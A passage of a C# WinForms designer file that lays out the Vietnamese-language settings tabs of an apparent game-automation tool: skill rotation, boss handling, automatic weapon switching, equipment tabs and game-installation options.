		this.comboBoxKieu2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxKieu2.DropDownWidth = 80;
		this.comboBoxKieu2.FormattingEnabled = true;
		this.comboBoxKieu2.Location = new System.Drawing.Point(140, 61);
		this.comboBoxKieu2.Name = "comboBoxKieu2";
		this.comboBoxKieu2.Size = new System.Drawing.Size(55, 23);
		this.comboBoxKieu2.TabIndex = 35;
		this.comboBoxKieu2.SelectedIndexChanged += new System.EventHandler(comboBoxKieu2_SelectedIndexChanged);
		this.comboBoxKieu1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxKieu1.DropDownWidth = 80;
		this.comboBoxKieu1.FormattingEnabled = true;
		this.comboBoxKieu1.Location = new System.Drawing.Point(140, 22);
		this.comboBoxKieu1.Name = "comboBoxKieu1";
		this.comboBoxKieu1.Size = new System.Drawing.Size(55, 23);
		this.comboBoxKieu1.TabIndex = 34;
		this.comboBoxKieu1.SelectedIndexChanged += new System.EventHandler(comboBoxKieu1_SelectedIndexChanged);
		this.textBoxChuyenTrai3.Location = new System.Drawing.Point(199, 99);
		this.textBoxChuyenTrai3.Margin = new System.Windows.Forms.Padding(2);
		this.textBoxChuyenTrai3.Name = "textBoxChuyenTrai3";
		this.textBoxChuyenTrai3.Size = new System.Drawing.Size(40, 21);
		this.textBoxChuyenTrai3.TabIndex = 33;
		this.textBoxChuyenTrai3.TextChanged += new System.EventHandler(textBoxChuyenTrai3_TextChanged);
		this.comboBoxChuyenTrai1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChuyenTrai1.DropDownWidth = 180;
		this.comboBoxChuyenTrai1.FormattingEnabled = true;
		this.comboBoxChuyenTrai1.Location = new System.Drawing.Point(15, 22);
		this.comboBoxChuyenTrai1.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxChuyenTrai1.Name = "comboBoxChuyenTrai1";
		this.comboBoxChuyenTrai1.Size = new System.Drawing.Size(120, 23);
		this.comboBoxChuyenTrai1.TabIndex = 25;
		this.comboBoxChuyenTrai1.SelectedIndexChanged += new System.EventHandler(comboBoxChuyenTrai1_SelectedIndexChanged);
		this.checkBoxChuyenTrai1.AutoSize = true;
		this.checkBoxChuyenTrai1.Location = new System.Drawing.Point(3, 2);
		this.checkBoxChuyenTrai1.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxChuyenTrai1.Name = "checkBoxChuyenTrai1";
		this.checkBoxChuyenTrai1.Size = new System.Drawing.Size(227, 19);
		this.checkBoxChuyenTrai1.TabIndex = 28;
		this.checkBoxChuyenTrai1.Text = "skill 1                                   Chọn       Số";
		this.checkBoxChuyenTrai1.UseVisualStyleBackColor = true;
		this.checkBoxChuyenTrai1.CheckedChanged += new System.EventHandler(checkBoxChuyenTrai1_CheckedChanged);
		this.comboBoxChuyenTrai2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChuyenTrai2.DropDownWidth = 180;
		this.comboBoxChuyenTrai2.FormattingEnabled = true;
		this.comboBoxChuyenTrai2.Location = new System.Drawing.Point(15, 61);
		this.comboBoxChuyenTrai2.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxChuyenTrai2.Name = "comboBoxChuyenTrai2";
		this.comboBoxChuyenTrai2.Size = new System.Drawing.Size(120, 23);
		this.comboBoxChuyenTrai2.TabIndex = 26;
		this.comboBoxChuyenTrai2.SelectedIndexChanged += new System.EventHandler(comboBoxChuyenTrai2_SelectedIndexChanged);
		this.comboBoxChuyenTrai3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChuyenTrai3.DropDownWidth = 180;
		this.comboBoxChuyenTrai3.FormattingEnabled = true;
		this.comboBoxChuyenTrai3.Location = new System.Drawing.Point(14, 98);
		this.comboBoxChuyenTrai3.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxChuyenTrai3.Name = "comboBoxChuyenTrai3";
		this.comboBoxChuyenTrai3.Size = new System.Drawing.Size(120, 23);
		this.comboBoxChuyenTrai3.TabIndex = 27;
		this.comboBoxChuyenTrai3.SelectedIndexChanged += new System.EventHandler(comboBoxChuyenTrai3_SelectedIndexChanged);
		this.checkBoxChuyenTrai3.AutoSize = true;
		this.checkBoxChuyenTrai3.Location = new System.Drawing.Point(3, 82);
		this.checkBoxChuyenTrai3.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxChuyenTrai3.Name = "checkBoxChuyenTrai3";
		this.checkBoxChuyenTrai3.Size = new System.Drawing.Size(57, 19);
		this.checkBoxChuyenTrai3.TabIndex = 30;
		this.checkBoxChuyenTrai3.Text = "skill 3";
		this.checkBoxChuyenTrai3.UseVisualStyleBackColor = true;
		this.checkBoxChuyenTrai3.CheckedChanged += new System.EventHandler(checkBoxChuyenTrai3_CheckedChanged);
		this.textBoxChuyenTrai1.Location = new System.Drawing.Point(199, 22);
		this.textBoxChuyenTrai1.Margin = new System.Windows.Forms.Padding(2);
		this.textBoxChuyenTrai1.Name = "textBoxChuyenTrai1";
		this.textBoxChuyenTrai1.Size = new System.Drawing.Size(40, 21);
		this.textBoxChuyenTrai1.TabIndex = 31;
		this.textBoxChuyenTrai1.TextChanged += new System.EventHandler(textBoxChuyenTrai1_TextChanged);
		this.checkBoxChuyenTrai2.AutoSize = true;
		this.checkBoxChuyenTrai2.Location = new System.Drawing.Point(2, 45);
		this.checkBoxChuyenTrai2.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxChuyenTrai2.Name = "checkBoxChuyenTrai2";
		this.checkBoxChuyenTrai2.Size = new System.Drawing.Size(57, 19);
		this.checkBoxChuyenTrai2.TabIndex = 29;
		this.checkBoxChuyenTrai2.Text = "skill 2";
		this.checkBoxChuyenTrai2.UseVisualStyleBackColor = true;
		this.checkBoxChuyenTrai2.CheckedChanged += new System.EventHandler(checkBoxChuyenTrai2_CheckedChanged);
		this.textBoxChuyenTrai2.Location = new System.Drawing.Point(199, 62);
		this.textBoxChuyenTrai2.Margin = new System.Windows.Forms.Padding(2);
		this.textBoxChuyenTrai2.Name = "textBoxChuyenTrai2";
		this.textBoxChuyenTrai2.Size = new System.Drawing.Size(40, 21);
		this.textBoxChuyenTrai2.TabIndex = 32;
		this.textBoxChuyenTrai2.TextChanged += new System.EventHandler(textBoxChuyenTrai2_TextChanged);
		this.tabPage20.Controls.Add(this.textBoxChuyenPhai3);
		this.tabPage20.Controls.Add(this.comboBoxChuyenPhai1);
		this.tabPage20.Controls.Add(this.comboBoxChuyenPhai2);
		this.tabPage20.Controls.Add(this.checkBoxChuyenPhai3);
		this.tabPage20.Controls.Add(this.checkBoxChuyenPhai2);
		this.tabPage20.Controls.Add(this.textBoxChuyenPhai2);
		this.tabPage20.Controls.Add(this.textBoxChuyenPhai1);
		this.tabPage20.Controls.Add(this.comboBoxChuyenPhai3);
		this.tabPage20.Controls.Add(this.checkBoxChuyenPhai1);
		this.tabPage20.Location = new System.Drawing.Point(4, 24);
		this.tabPage20.Name = "tabPage20";
		this.tabPage20.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage20.Size = new System.Drawing.Size(241, 122);
		this.tabPage20.TabIndex = 1;
		this.tabPage20.Text = "Chiêu phải (ms)";
		this.tabPage20.UseVisualStyleBackColor = true;
		this.textBoxChuyenPhai3.Location = new System.Drawing.Point(194, 98);
		this.textBoxChuyenPhai3.Margin = new System.Windows.Forms.Padding(2);
		this.textBoxChuyenPhai3.Name = "textBoxChuyenPhai3";
		this.textBoxChuyenPhai3.Size = new System.Drawing.Size(44, 21);
		this.textBoxChuyenPhai3.TabIndex = 39;
		this.textBoxChuyenPhai3.TextChanged += new System.EventHandler(textBoxChuyenPhai3_TextChanged);
		this.comboBoxChuyenPhai1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChuyenPhai1.FormattingEnabled = true;
		this.comboBoxChuyenPhai1.Location = new System.Drawing.Point(21, 22);
		this.comboBoxChuyenPhai1.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxChuyenPhai1.Name = "comboBoxChuyenPhai1";
		this.comboBoxChuyenPhai1.Size = new System.Drawing.Size(169, 23);
		this.comboBoxChuyenPhai1.TabIndex = 31;
		this.comboBoxChuyenPhai1.SelectedIndexChanged += new System.EventHandler(comboBoxChuyenPhai1_SelectedIndexChanged);
		this.comboBoxChuyenPhai2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChuyenPhai2.FormattingEnabled = true;
		this.comboBoxChuyenPhai2.Location = new System.Drawing.Point(22, 59);
		this.comboBoxChuyenPhai2.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxChuyenPhai2.Name = "comboBoxChuyenPhai2";
		this.comboBoxChuyenPhai2.Size = new System.Drawing.Size(169, 23);
		this.comboBoxChuyenPhai2.TabIndex = 32;
		this.comboBoxChuyenPhai2.SelectedIndexChanged += new System.EventHandler(comboBoxChuyenPhai2_SelectedIndexChanged);
		this.checkBoxChuyenPhai3.AutoSize = true;
		this.checkBoxChuyenPhai3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxChuyenPhai3.Location = new System.Drawing.Point(5, 80);
		this.checkBoxChuyenPhai3.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxChuyenPhai3.Name = "checkBoxChuyenPhai3";
		this.checkBoxChuyenPhai3.Size = new System.Drawing.Size(52, 17);
		this.checkBoxChuyenPhai3.TabIndex = 36;
		this.checkBoxChuyenPhai3.Text = "skill 3";
		this.checkBoxChuyenPhai3.UseVisualStyleBackColor = true;
		this.checkBoxChuyenPhai3.CheckedChanged += new System.EventHandler(checkBoxChuyenPhai3_CheckedChanged);
		this.checkBoxChuyenPhai2.AutoSize = true;
		this.checkBoxChuyenPhai2.Location = new System.Drawing.Point(5, 42);
		this.checkBoxChuyenPhai2.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxChuyenPhai2.Name = "checkBoxChuyenPhai2";
		this.checkBoxChuyenPhai2.Size = new System.Drawing.Size(57, 19);
		this.checkBoxChuyenPhai2.TabIndex = 35;
		this.checkBoxChuyenPhai2.Text = "skill 2";
		this.checkBoxChuyenPhai2.UseVisualStyleBackColor = true;
		this.checkBoxChuyenPhai2.CheckedChanged += new System.EventHandler(checkBoxChuyenPhai2_CheckedChanged);
		this.textBoxChuyenPhai2.Location = new System.Drawing.Point(194, 59);
		this.textBoxChuyenPhai2.Margin = new System.Windows.Forms.Padding(2);
		this.textBoxChuyenPhai2.Name = "textBoxChuyenPhai2";
		this.textBoxChuyenPhai2.Size = new System.Drawing.Size(44, 21);
		this.textBoxChuyenPhai2.TabIndex = 38;
		this.textBoxChuyenPhai2.TextChanged += new System.EventHandler(textBoxChuyenPhai2_TextChanged);
		this.textBoxChuyenPhai1.Location = new System.Drawing.Point(193, 22);
		this.textBoxChuyenPhai1.Margin = new System.Windows.Forms.Padding(2);
		this.textBoxChuyenPhai1.Name = "textBoxChuyenPhai1";
		this.textBoxChuyenPhai1.Size = new System.Drawing.Size(44, 21);
		this.textBoxChuyenPhai1.TabIndex = 37;
		this.textBoxChuyenPhai1.TextChanged += new System.EventHandler(textBoxChuyenPhai1_TextChanged);
		this.comboBoxChuyenPhai3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxChuyenPhai3.FormattingEnabled = true;
		this.comboBoxChuyenPhai3.Location = new System.Drawing.Point(22, 97);
		this.comboBoxChuyenPhai3.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxChuyenPhai3.Name = "comboBoxChuyenPhai3";
		this.comboBoxChuyenPhai3.Size = new System.Drawing.Size(169, 23);
		this.comboBoxChuyenPhai3.TabIndex = 33;
		this.comboBoxChuyenPhai3.SelectedIndexChanged += new System.EventHandler(comboBoxChuyenPhai3_SelectedIndexChanged);
		this.checkBoxChuyenPhai1.AutoSize = true;
		this.checkBoxChuyenPhai1.Location = new System.Drawing.Point(5, 5);
		this.checkBoxChuyenPhai1.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxChuyenPhai1.Name = "checkBoxChuyenPhai1";
		this.checkBoxChuyenPhai1.Size = new System.Drawing.Size(229, 19);
		this.checkBoxChuyenPhai1.TabIndex = 34;
		this.checkBoxChuyenPhai1.Text = "Skill1                                                    ms";
		this.checkBoxChuyenPhai1.UseVisualStyleBackColor = true;
		this.checkBoxChuyenPhai1.CheckedChanged += new System.EventHandler(checkBoxChuyenPhai1_CheckedChanged);
		this.tabPage22.Controls.Add(this.label39);
		this.tabPage22.Controls.Add(this.checkBoxGapBossNL);
		this.tabPage22.Controls.Add(this.textBoxGapBoss);
		this.tabPage22.Controls.Add(this.comboBoxGapBoss);
		this.tabPage22.Controls.Add(this.checkBoxGapBossChieu);
		this.tabPage22.Location = new System.Drawing.Point(4, 24);
		this.tabPage22.Name = "tabPage22";
		this.tabPage22.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage22.Size = new System.Drawing.Size(241, 122);
		this.tabPage22.TabIndex = 2;
		this.tabPage22.Text = "Gặp Boss";
		this.tabPage22.UseVisualStyleBackColor = true;
		this.label39.Location = new System.Drawing.Point(1, 2);
		this.label39.Name = "label39";
		this.label39.Size = new System.Drawing.Size(240, 42);
		this.label39.TabIndex = 34;
		this.label39.Text = "Phần này được ưu tiên xét trước chuyển chiêu    tay trái.";
		this.checkBoxGapBossNL.AutoSize = true;
		this.checkBoxGapBossNL.Location = new System.Drawing.Point(4, 74);
		this.checkBoxGapBossNL.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxGapBossNL.Name = "checkBoxGapBossNL";
		this.checkBoxGapBossNL.Size = new System.Drawing.Size(140, 19);
		this.checkBoxGapBossNL.TabIndex = 33;
		this.checkBoxGapBossNL.Text = "Bỏ qua khi nội lực <=";
		this.checkBoxGapBossNL.UseVisualStyleBackColor = true;
		this.checkBoxGapBossNL.CheckedChanged += new System.EventHandler(checkBoxGapBossNL_CheckedChanged);
		this.textBoxGapBoss.Location = new System.Drawing.Point(146, 72);
		this.textBoxGapBoss.Margin = new System.Windows.Forms.Padding(2);
		this.textBoxGapBoss.Name = "textBoxGapBoss";
		this.textBoxGapBoss.Size = new System.Drawing.Size(40, 21);
		this.textBoxGapBoss.TabIndex = 32;
		this.textBoxGapBoss.TextChanged += new System.EventHandler(textBoxGapBoss_TextChanged);
		this.comboBoxGapBoss.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxGapBoss.DropDownWidth = 180;
		this.comboBoxGapBoss.FormattingEnabled = true;
		this.comboBoxGapBoss.Location = new System.Drawing.Point(112, 45);
		this.comboBoxGapBoss.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxGapBoss.Name = "comboBoxGapBoss";
		this.comboBoxGapBoss.Size = new System.Drawing.Size(129, 23);
		this.comboBoxGapBoss.TabIndex = 29;
		this.comboBoxGapBoss.SelectedIndexChanged += new System.EventHandler(comboBoxGapBoss_SelectedIndexChanged);
		this.checkBoxGapBossChieu.AutoSize = true;
		this.checkBoxGapBossChieu.Location = new System.Drawing.Point(4, 47);
		this.checkBoxGapBossChieu.Margin = new System.Windows.Forms.Padding(2);
		this.checkBoxGapBossChieu.Name = "checkBoxGapBossChieu";
		this.checkBoxGapBossChieu.Size = new System.Drawing.Size(118, 19);
		this.checkBoxGapBossChieu.TabIndex = 30;
		this.checkBoxGapBossChieu.Text = "Luôn đánh chiêu";
		this.checkBoxGapBossChieu.UseVisualStyleBackColor = true;
		this.checkBoxGapBossChieu.CheckedChanged += new System.EventHandler(checkBoxGapBossChieu_CheckedChanged);
		this.checkBoxTuGiaiBua.AutoSize = true;
		this.checkBoxTuGiaiBua.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTuGiaiBua.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTuGiaiBua.Location = new System.Drawing.Point(255, 76);
		this.checkBoxTuGiaiBua.Name = "checkBoxTuGiaiBua";
		this.checkBoxTuGiaiBua.Size = new System.Drawing.Size(15, 14);
		this.checkBoxTuGiaiBua.TabIndex = 320;
		this.checkBoxTuGiaiBua.UseVisualStyleBackColor = false;
		this.checkBoxTuGiaiBua.CheckedChanged += new System.EventHandler(checkBoxTuGiaiBua_CheckedChanged);
		this.checkBoxTNXuatChieu120.AutoSize = true;
		this.checkBoxTNXuatChieu120.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTNXuatChieu120.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTNXuatChieu120.Location = new System.Drawing.Point(255, 104);
		this.checkBoxTNXuatChieu120.Name = "checkBoxTNXuatChieu120";
		this.checkBoxTNXuatChieu120.Size = new System.Drawing.Size(15, 14);
		this.checkBoxTNXuatChieu120.TabIndex = 321;
		this.checkBoxTNXuatChieu120.UseVisualStyleBackColor = false;
		this.checkBoxTNXuatChieu120.CheckedChanged += new System.EventHandler(checkBoxTNXuatChieu120_CheckedChanged);
		this.tabPageBaoVat.Controls.Add(this.textBoxVukhi1);
		this.tabPageBaoVat.Controls.Add(this.richTextBox3);
		this.tabPageBaoVat.Controls.Add(this.comboBoxVukhiKieu0);
		this.tabPageBaoVat.Controls.Add(this.textBoxVukhi0);
		this.tabPageBaoVat.Controls.Add(this.comboBoxVukhi1);
		this.tabPageBaoVat.Controls.Add(this.comboBoxVukhiKieu1);
		this.tabPageBaoVat.Controls.Add(this.checkBoxVukhi1);
		this.tabPageBaoVat.Controls.Add(this.comboBoxVukhi0);
		this.tabPageBaoVat.Controls.Add(this.checkBoxVukhi0);
		this.tabPageBaoVat.Location = new System.Drawing.Point(4, 24);
		this.tabPageBaoVat.Name = "tabPageBaoVat";
		this.tabPageBaoVat.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageBaoVat.Size = new System.Drawing.Size(390, 266);
		this.tabPageBaoVat.TabIndex = 4;
		this.tabPageBaoVat.Text = "Vũ khí";
		this.tabPageBaoVat.UseVisualStyleBackColor = true;
		this.textBoxVukhi1.Location = new System.Drawing.Point(329, 177);
		this.textBoxVukhi1.Name = "textBoxVukhi1";
		this.textBoxVukhi1.Size = new System.Drawing.Size(58, 21);
		this.textBoxVukhi1.TabIndex = 8;
		this.textBoxVukhi1.TextChanged += new System.EventHandler(textBoxVukhi1_TextChanged);
		this.richTextBox3.BackColor = System.Drawing.SystemColors.Window;
		this.richTextBox3.Location = new System.Drawing.Point(0, 3);
		this.richTextBox3.Name = "richTextBox3";
		this.richTextBox3.ReadOnly = true;
		this.richTextBox3.Size = new System.Drawing.Size(390, 90);
		this.richTextBox3.TabIndex = 0;
		this.richTextBox3.Text = "Chức năng Tự động thay vũ khí:\n- Phải chừa ô trống trong rương\n- Phải khóa bảo hiểm vũ khí\n (tránh quăng vũ khí ra ngoài)\n- Không để nhặt hoặc chỉ nhặt tiền.";
		this.comboBoxVukhiKieu0.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxVukhiKieu0.DropDownWidth = 100;
		this.comboBoxVukhiKieu0.FormattingEnabled = true;
		this.comboBoxVukhiKieu0.Location = new System.Drawing.Point(249, 120);
		this.comboBoxVukhiKieu0.Name = "comboBoxVukhiKieu0";
		this.comboBoxVukhiKieu0.Size = new System.Drawing.Size(70, 23);
		this.comboBoxVukhiKieu0.TabIndex = 5;
		this.comboBoxVukhiKieu0.SelectedIndexChanged += new System.EventHandler(comboBoxVukhiKieu0_SelectedIndexChanged);
		this.textBoxVukhi0.Location = new System.Drawing.Point(329, 121);
		this.textBoxVukhi0.Name = "textBoxVukhi0";
		this.textBoxVukhi0.Size = new System.Drawing.Size(58, 21);
		this.textBoxVukhi0.TabIndex = 7;
		this.textBoxVukhi0.TextChanged += new System.EventHandler(textBoxVukhi0_TextChanged);
		this.comboBoxVukhi1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxVukhi1.DropDownWidth = 200;
		this.comboBoxVukhi1.FormattingEnabled = true;
		this.comboBoxVukhi1.Location = new System.Drawing.Point(22, 177);
		this.comboBoxVukhi1.Name = "comboBoxVukhi1";
		this.comboBoxVukhi1.Size = new System.Drawing.Size(221, 23);
		this.comboBoxVukhi1.TabIndex = 3;
		this.comboBoxVukhi1.SelectedIndexChanged += new System.EventHandler(comboBoxVukhi1_SelectedIndexChanged);
		this.comboBoxVukhi1.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxVukhi1_MouseDown);
		this.comboBoxVukhiKieu1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxVukhiKieu1.DropDownWidth = 100;
		this.comboBoxVukhiKieu1.FormattingEnabled = true;
		this.comboBoxVukhiKieu1.Location = new System.Drawing.Point(249, 176);
		this.comboBoxVukhiKieu1.Name = "comboBoxVukhiKieu1";
		this.comboBoxVukhiKieu1.Size = new System.Drawing.Size(70, 23);
		this.comboBoxVukhiKieu1.TabIndex = 6;
		this.comboBoxVukhiKieu1.SelectedIndexChanged += new System.EventHandler(comboBoxVukhiKieu1_SelectedIndexChanged);
		this.checkBoxVukhi1.AutoSize = true;
		this.checkBoxVukhi1.Location = new System.Drawing.Point(3, 152);
		this.checkBoxVukhi1.Name = "checkBoxVukhi1";
		this.checkBoxVukhi1.Size = new System.Drawing.Size(116, 19);
		this.checkBoxVukhi1.TabIndex = 4;
		this.checkBoxVukhi1.Text = "Điền tên vũ khí 2";
		this.checkBoxVukhi1.UseVisualStyleBackColor = true;
		this.checkBoxVukhi1.CheckedChanged += new System.EventHandler(checkBoxVukhi1_CheckedChanged);
		this.comboBoxVukhi0.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxVukhi0.DropDownWidth = 200;
		this.comboBoxVukhi0.FormattingEnabled = true;
		this.comboBoxVukhi0.Location = new System.Drawing.Point(22, 121);
		this.comboBoxVukhi0.Name = "comboBoxVukhi0";
		this.comboBoxVukhi0.Size = new System.Drawing.Size(221, 23);
		this.comboBoxVukhi0.TabIndex = 1;
		this.comboBoxVukhi0.SelectedIndexChanged += new System.EventHandler(comboBoxVukhi0_SelectedIndexChanged);
		this.comboBoxVukhi0.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxVukhi0_MouseDown);
		this.checkBoxVukhi0.AutoSize = true;
		this.checkBoxVukhi0.Location = new System.Drawing.Point(3, 99);
		this.checkBoxVukhi0.Name = "checkBoxVukhi0";
		this.checkBoxVukhi0.Size = new System.Drawing.Size(377, 19);
		this.checkBoxVukhi0.TabIndex = 2;
		this.checkBoxVukhi0.Text = "Điền tên vũ khí 1                                                        Loại                  Số";
		this.checkBoxVukhi0.UseVisualStyleBackColor = true;
		this.checkBoxVukhi0.CheckedChanged += new System.EventHandler(checkBoxVukhi0_CheckedChanged);
		this.tabPagetrangbi.Controls.Add(this.pictureBox1);
		this.tabPagetrangbi.Controls.Add(this.tabControl4);
		this.tabPagetrangbi.Location = new System.Drawing.Point(4, 24);
		this.tabPagetrangbi.Name = "tabPagetrangbi";
		this.tabPagetrangbi.Size = new System.Drawing.Size(390, 266);
		this.tabPagetrangbi.TabIndex = 5;
		this.tabPagetrangbi.Text = "Trang Bị";
		this.tabPagetrangbi.UseVisualStyleBackColor = true;
		this.pictureBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("pictureBox1.BackgroundImage");
		this.pictureBox1.Location = new System.Drawing.Point(0, 2);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(216, 266);
		this.pictureBox1.TabIndex = 1;
		this.pictureBox1.TabStop = false;
		this.tabControl4.Controls.Add(this.tabPagedoxanh);
		this.tabControl4.Controls.Add(this.tabPageHKMP);
		this.tabControl4.Location = new System.Drawing.Point(222, 3);
		this.tabControl4.Name = "tabControl4";
		this.tabControl4.SelectedIndex = 0;
		this.tabControl4.Size = new System.Drawing.Size(165, 261);
		this.tabControl4.TabIndex = 0;
		this.tabPagedoxanh.Location = new System.Drawing.Point(4, 24);
		this.tabPagedoxanh.Name = "tabPagedoxanh";
		this.tabPagedoxanh.Padding = new System.Windows.Forms.Padding(3);
		this.tabPagedoxanh.Size = new System.Drawing.Size(157, 233);
		this.tabPagedoxanh.TabIndex = 0;
		this.tabPagedoxanh.Text = "Đồ Xanh";
		this.tabPagedoxanh.UseVisualStyleBackColor = true;
		this.tabPageHKMP.Location = new System.Drawing.Point(4, 24);
		this.tabPageHKMP.Name = "tabPageHKMP";
		this.tabPageHKMP.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageHKMP.Size = new System.Drawing.Size(157, 233);
		this.tabPageHKMP.TabIndex = 1;
		this.tabPageHKMP.Text = "HKMP";
		this.tabPageHKMP.UseVisualStyleBackColor = true;
		this.tabPage7.Controls.Add(this.checkBoxGame);
		this.tabPage7.Controls.Add(this.buttonReset1ac);
		this.tabPage7.Controls.Add(this.checkBoxDoiTitle);
		this.tabPage7.Controls.Add(this.buttonResetAuto);
		this.tabPage7.Controls.Add(this.checkBoxBaoKeylog);
		this.tabPage7.Controls.Add(this.linkLabelTrangchu);
		this.tabPage7.Controls.Add(this.checkBoxChayRunAdmin);
		this.tabPage7.Controls.Add(this.buttonTuTimWeb);
		this.tabPage7.Controls.Add(this.checkBoxGameHu);
		this.tabPage7.Controls.Add(this.checkBoxGiamRamTudong);
		this.tabPage7.Controls.Add(this.comboBoxGameOfWeb);
		this.tabPage7.Controls.Add(this.buttonFixGameTuthoat);
		this.tabPage7.Controls.Add(this.tabControl2);
		this.tabPage7.Controls.Add(this.textBoxChatNham);
		this.tabPage7.Controls.Add(this.textBoxThuMuc);
		this.tabPage7.Controls.Add(this.checkBoxChatNham);
		this.tabPage7.Controls.Add(this.buttonBrowseGame);
		this.tabPage7.Controls.Add(this.buttonThumucAuto);
		this.tabPage7.Controls.Add(this.label1);
		this.tabPage7.Controls.Add(this.buttonToShortcut);
		this.tabPage7.Controls.Add(this.label6);
		this.tabPage7.Location = new System.Drawing.Point(4, 30);
		this.tabPage7.Name = "tabPage7";
		this.tabPage7.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage7.Size = new System.Drawing.Size(391, 290);
		this.tabPage7.TabIndex = 3;
		this.tabPage7.Text = "Cài game";
		this.tabPage7.UseVisualStyleBackColor = true;
		this.checkBoxGame.AutoSize = true;
		this.checkBoxGame.ForeColor = System.Drawing.Color.Red;
		this.checkBoxGame.Location = new System.Drawing.Point(3, 245);
		this.checkBoxGame.Name = "checkBoxGame";
		this.checkBoxGame.Size = new System.Drawing.Size(195, 19);
		this.checkBoxGame.TabIndex = 399;
		this.checkBoxGame.Text = "Fix lỗi game để hạn chế bị diss";
		this.checkBoxGame.UseVisualStyleBackColor = true;
		this.checkBoxGame.CheckedChanged += new System.EventHandler(checkBoxGame_CheckedChanged);
		this.buttonReset1ac.BackColor = System.Drawing.SystemColors.Control;
		this.buttonReset1ac.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonReset1ac.ForeColor = System.Drawing.Color.Teal;
		this.buttonReset1ac.Location = new System.Drawing.Point(261, 80);
		this.buttonReset1ac.Name = "buttonReset1ac";
		this.buttonReset1ac.Size = new System.Drawing.Size(125, 51);
		this.buttonReset1ac.TabIndex = 398;
		this.buttonReset1ac.Text = "Xóa lỗi cấu hình 1 ac";
		this.buttonReset1ac.UseVisualStyleBackColor = false;
		this.buttonReset1ac.Click += new System.EventHandler(buttonReset1ac_Click);
		this.checkBoxDoiTitle.AutoSize = true;
		this.checkBoxDoiTitle.Checked = true;
		this.checkBoxDoiTitle.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBoxDoiTitle.ForeColor = System.Drawing.Color.Red;
		this.checkBoxDoiTitle.Location = new System.Drawing.Point(169, 211);
		this.checkBoxDoiTitle.Name = "checkBoxDoiTitle";
		this.checkBoxDoiTitle.Size = new System.Drawing.Size(92, 19);
		this.checkBoxDoiTitle.TabIndex = 397;
		this.checkBoxDoiTitle.Text = "Đổi tên auto";
		this.checkBoxDoiTitle.UseVisualStyleBackColor = true;
		this.checkBoxDoiTitle.CheckedChanged += new System.EventHandler(checkBoxDoiTitle_CheckedChanged);
		this.buttonResetAuto.BackColor = System.Drawing.SystemColors.Control;
		this.buttonResetAuto.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonResetAuto.ForeColor = System.Drawing.Color.Teal;
		this.buttonResetAuto.Location = new System.Drawing.Point(263, 23);
		this.buttonResetAuto.Name = "buttonResetAuto";
		this.buttonResetAuto.Size = new System.Drawing.Size(123, 54);
		this.buttonResetAuto.TabIndex = 344;
		this.buttonResetAuto.Text = "Reset cấu hình auto";
		this.buttonResetAuto.UseVisualStyleBackColor = false;
		this.buttonResetAuto.Click += new System.EventHandler(buttonResetAuto_Click);
		this.checkBoxBaoKeylog.AutoSize = true;
		this.checkBoxBaoKeylog.ForeColor = System.Drawing.Color.Black;
		this.checkBoxBaoKeylog.Location = new System.Drawing.Point(3, 227);
		this.checkBoxBaoKeylog.Name = "checkBoxBaoKeylog";
		this.checkBoxBaoKeylog.Size = new System.Drawing.Size(154, 19);
		this.checkBoxBaoKeylog.TabIndex = 396;
		this.checkBoxBaoKeylog.Text = "Báo keylog virus nếu có";
		this.checkBoxBaoKeylog.UseVisualStyleBackColor = true;
		this.checkBoxBaoKeylog.CheckedChanged += new System.EventHandler(checkBoxBaoKeylog_CheckedChanged);
		this.linkLabelTrangchu.AutoSize = true;
		this.linkLabelTrangchu.Location = new System.Drawing.Point(172, 106);
		this.linkLabelTrangchu.Name = "linkLabelTrangchu";
		this.linkLabelTrangchu.Size = new System.Drawing.Size(93, 15);
		this.linkLabelTrangchu.TabIndex = 166;
